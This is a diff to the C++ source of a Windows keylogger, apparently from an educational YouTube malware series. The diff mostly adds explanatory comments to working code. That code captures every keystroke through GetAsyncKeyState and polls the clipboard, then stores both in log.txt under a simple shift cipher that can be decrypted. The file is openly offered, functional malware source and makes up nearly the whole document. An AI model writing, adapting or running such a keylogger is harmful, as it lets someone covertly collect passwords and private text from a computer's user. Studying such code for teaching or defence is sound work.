@@ -1,4 +1,47 @@
 ```c++
+/**
+ * @file keylogger.cpp
+ * @brief A simple keylogger and clipboard logger program for Windows.
+ *
+ * ! IMPORTANT !
+ * This program is part of a series of videos on my youtube channel focused on explaining the basics of each malware at an engineering level and not just superficially.
+ * This series is under the name "ILEARNYOU" and there are different iterations of each program depending on the difficulty.
+ * I recommend you to watch the video to understand my reasoning and explanations and not just be a script kiddie.
+ * https://www.youtube.com/@impulsado
+ * 
+ * 
+ * This program is designed to monitor and log keyboard inputs and clipboard content on a Windows machine.
+ * It features a basic encryption mechanism to store the logged data securely in a file. The program
+ * operates using two main threads: one for logging clipboard changes and another for capturing keystrokes.
+ *
+ * The clipboard logger periodically checks for changes in the system clipboard and logs any new text
+ * content it detects. The keylogger captures key presses by checking the state of each key in a loop.
+ * Both types of logged data are encrypted using a simple character shift cipher before being saved.
+ *
+ * The encryption is performed by shifting the ASCII value of each character based on a user-defined key.
+ * This key is also used during decryption to restore the original data. The encrypted data is stored in
+ * a log file, and a separate file is used to save the decrypted output.
+ *
+ * The main components of the program include:
+ * - Clipboard monitoring: Retrieves and logs text content from the clipboard.
+ * - Keylogging: Captures and logs user keystrokes.
+ * - Encryption: Secures the logged data using a shift cipher.
+ * - Decryption: Allows the encrypted data to be decrypted and read.
+ *
+ * @section usage Usage
+ * The program can be compiled and run on Windows. It provides the following command line options:
+ * - No arguments: Starts the logging of clipboard content and keystrokes.
+ * - Two arguments: `-d <key>` decrypts the log file using the provided key.
+ *
+ * @section dependencies Dependencies
+ * This program requires Windows API headers for accessing system clipboard and key states.
+ *
+ * @section author Author
+ * @impulsado [wannaNotes](https://github.com/impulsado/wannaNotes)
+ *
+ * @date August 2024
+ */
+
 #include <iostream>
 #include <windows.h>
 #include <fstream>
@@ -58,17 +101,24 @@ bool isShift() {
  * @param key The key used to generate the random shift for encryption.
  */
 void save(const string& input, int key) {
+    // Open a file named "log.txt" in append and binary mode
     ofstream outFile("log.txt", ios::app | ios::binary);
+    // Check if the file was opened successfully
     if (!outFile.is_open()) {
+        // If the file couldn't be opened, output an error message and exit the function
         cout << "Error opening log file for writing." << endl;
         return;
     }
 
+    // Loop through each character in the input string
     for (char c : input) {
-        int shift = 1 + key % 10;  // Calculate the shift
-        outFile.put(c + shift);  // Save the key pressed + shift to the file
+        // Calculate a shift value between 0 and 9 based on the provided key
+        int shift = 1 + key % 10;
+        // Encrypt the character by adding the shift value to its ASCII code and write it to the file
+        outFile.put(c + shift);
     }
 
+    // Close the file to ensure the data is written and resources are freed
     outFile.close();
 }
 
@@ -141,9 +191,11 @@ bool specialKey(char key, int passwd) {
  * @param key The key used for decryption.
  */
 void decrypt(const string& filename, int key) {
-    ifstream file(filename, ios::binary);
-    ofstream decrypted("decrypted.txt");
+    // Open the file for reading in binary mode and create a new file for writing the decrypted content
+    ifstream file(filename, ios::binary);  // ifstream for reading the file
+    ofstream decrypted("decrypted.txt");  // ofstream for writing the decrypted content
 
+    // Check if the files were opened successfully
     if (!file.is_open()) {
         cout << "Error opening file." << endl;
         return;
@@ -154,14 +206,17 @@ void decrypt(const string& filename, int key) {
         return;
     }
 
+    // Read each character from the file and decrypt it using the provided key
     char c;
     while (file.get(c)) {
         int shift = 1 + key % 10;  // Calculate the shift
         decrypted.put(c - shift);  // Decrypt and write to the new file
     }
 
+    // Output a success message once the decryption is complete
     cout << "File decrypted successfully." << endl;
 
+    // Close the files to ensure the data is written and resources are freed
     file.close();
     decrypted.close();
 }
@@ -175,23 +230,34 @@ void decrypt(const string& filename, int key) {
  * @return The text currently stored in the clipboard.
  */
 string getClipboardText() {
+    // Initialize an empty string to store the clipboard text
     string text = "";
 
-    if (!OpenClipboard(nullptr)) {
-        return text;
-    }
+    // Attempt to open the clipboard for the current process
+    // nullptr indicates that the clipboard is associated with the current task
+    if (!OpenClipboard(nullptr)) return text;  // If opening fails, return an empty string
 
+    // Retrieve a handle to the clipboard data in Unicode text format
     HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-    if (hData != nullptr) {
-        wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
-        if (pwszText != nullptr) {
-            wstring ws(pwszText);
-            text = string(ws.begin(), ws.end());
-            GlobalUnlock(hData);
-        }
+    // If no data is available, or the data isn't in the expected format, return an empty string
+    if (hData == nullptr) return text;
+
+    // Lock the global memory block to get a pointer to the clipboard data
+    // GlobalLock converts the handle to a pointer to access the data safely
+    wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));  // Locking the global memory
+    if (pwszText != nullptr) {  // Check if the lock was successful
+        // Convert the wide-character string (wstring) to a standard string
+        wstring ws(pwszText);
+        // Create a string from the wide-character string, converting it to a narrow character string
+        text = string(ws.begin(), ws.end());
+        // Unlock the global memory block when done to allow other applications to use it
+        GlobalUnlock(hData);  // Unlocking it
     }
+    
+    // Close the clipboard to allow other applications to access it
     CloseClipboard();
 
+    // Return the clipboard text retrieved, or an empty string if none was available
     return text;
 }
 
@@ -232,7 +298,7 @@ void keyLogger(int passwd) {
     while (true) {
         Sleep(50);
 
-        for (char key = 8; key <= 222; key++) {
+        for (char key = 8; key <= 173; key++) {
             if (GetAsyncKeyState(key) == 0xFFFF8001) {  // Check if a key has been pressed
                 if (!specialKey(key, passwd)) {
                     string str(1, key);
